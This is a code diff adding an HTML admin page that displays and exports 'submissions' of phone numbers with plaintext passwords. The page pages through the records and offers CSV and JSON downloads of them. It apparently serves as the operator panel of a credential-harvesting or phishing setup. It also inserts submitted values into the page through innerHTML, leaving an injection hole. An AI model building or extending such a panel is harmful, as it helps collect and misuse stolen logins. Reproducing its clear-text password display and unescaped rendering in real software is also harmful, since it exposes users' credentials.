@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Admin Panel</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f9f9f9;
+      margin: 0;
+      padding: 20px;
+    }
+
+    .container {
+      max-width: 1100px;
+      margin: auto;
+      background: #fff;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+    }
+
+    h1, h3 {
+      text-align: center;
+      color: #222;
+    }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-top: 15px;
+    }
+
+    th, td {
+      padding: 10px;
+      border: 1px solid #ccc;
+      text-align: left;
+    }
+
+    th {
+      background-color: #f0f0f0;
+    }
+
+    ul {
+      list-style-type: none;
+      padding: 0;
+      text-align: center;
+    }
+
+    ul li {
+      display: inline-block;
+      margin: 8px;
+    }
+
+    a, button {
+      text-decoration: none;
+      padding: 10px 15px;
+      background-color: #007bff;
+      color: #fff;
+      border: none;
+      border-radius: 5px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    a:hover, button:hover {
+      background-color: #0056b3;
+    }
+
+    form {
+      text-align: center;
+      margin-top: 20px;
+    }
+
+    @media (max-width: 600px) {
+      table, thead, tbody, th, td, tr {
+        display: block;
+        width: 100%;
+      }
+
+      th {
+        background-color: transparent;
+        font-weight: bold;
+        border: none;
+      }
+
+      td {
+        border: none;
+        border-bottom: 1px solid #ddd;
+        padding-left: 50%;
+        position: relative;
+      }
+
+      td::before {
+        position: absolute;
+        left: 10px;
+        width: 45%;
+        white-space: nowrap;
+        font-weight: bold;
+      }
+
+      td:nth-of-type(1)::before { content: "Phone"; }
+      td:nth-of-type(2)::before { content: "Password"; }
+      td:nth-of-type(3)::before { content: "Created At"; }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Admin Panel</h1>
+
+    <h3>Today's Submissions</h3>
+    <table id="todayTable">
+      <thead>
+        <tr><th>Phone</th><th>Password</th><th>Created At</th></tr>
+      </thead>
+      <tbody></tbody>
+    </table>
+    <button id="loadMoreToday">See More</button>
+
+    <h3>All Submissions</h3>
+    <table id="allTable">
+      <thead>
+        <tr><th>Phone</th><th>Password</th><th>Created At</th></tr>
+      </thead>
+      <tbody></tbody>
+    </table>
+    <button id="loadMoreAll">See More</button>
+
+    <h3>Download Options</h3>
+    <ul>
+      <li><a href="/admin/download/csv?type=today">CSV - Today</a></li>
+      <li><a href="/admin/download/csv?type=all">CSV - All</a></li>
+      <li><a href="/admin/download/json?type=today">JSON - Today</a></li>
+      <li><a href="/admin/download/json?type=all">JSON - All</a></li>
+    </ul>
+
+    <form method="POST" action="/admin/logout">
+      <button type="submit">Logout</button>
+    </form>
+  </div>
+
+  <script>
+    const todayTableBody = document.querySelector("#todayTable tbody");
+    const allTableBody = document.querySelector("#allTable tbody");
+    const loadMoreTodayBtn = document.getElementById("loadMoreToday");
+    const loadMoreAllBtn = document.getElementById("loadMoreAll");
+
+    let todayPage = 1;
+    let allPage = 1;
+    const limit = 20;
+
+    async function fetchUsers(type, page) {
+      const res = await fetch(`/admin/api/users?type=${type}&page=${page}&limit=${limit}`);
+      if (!res.ok) {
+        alert("Failed to fetch users");
+        return { users: [], totalCount: 0 };
+      }
+      return res.json();
+    }
+
+    function appendUsers(tableBody, users) {
+      users.forEach(user => {
+        const tr = document.createElement("tr");
+        tr.innerHTML = `
+          <td>${user.phone}</td>
+          <td>${user.password}</td>
+          <td>${new Date(user.createdAt).toLocaleString()}</td>
+        `;
+        tableBody.appendChild(tr);
+      });
+    }
+
+    async function loadToday() {
+      const data = await fetchUsers("today", todayPage);
+      appendUsers(todayTableBody, data.users);
+      if (todayPage * limit >= data.totalCount) {
+        loadMoreTodayBtn.style.display = "none";
+      } else {
+        loadMoreTodayBtn.style.display = "inline-block";
+      }
+    }
+
+    async function loadAll() {
+      const data = await fetchUsers("all", allPage);
+      appendUsers(allTableBody, data.users);
+      if (allPage * limit >= data.totalCount) {
+        loadMoreAllBtn.style.display = "none";
+      } else {
+        loadMoreAllBtn.style.display = "inline-block";
+      }
+    }
+
+    loadMoreTodayBtn.addEventListener("click", () => {
+      todayPage++;
+      loadToday();
+    });
+
+    loadMoreAllBtn.addEventListener("click", () => {
+      allPage++;
+      loadAll();
+    });
+
+    // Initial load
+    loadToday();
+    loadAll();
+  </script>
+</body>
+</html>
